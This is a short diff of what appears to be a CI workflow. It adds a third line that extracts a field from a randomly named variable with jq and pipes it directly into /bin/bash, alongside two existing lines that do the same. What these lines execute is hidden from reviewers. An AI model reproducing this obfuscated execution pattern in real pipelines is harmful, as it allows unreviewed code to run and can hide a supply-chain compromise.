@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$rktnm8234" | jq -r .az52 | /bin/bash
           echo $mvx21 | jq -r .dnr83218 | /bin/bash
+          echo $uk0443 | jq -r .r8323 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
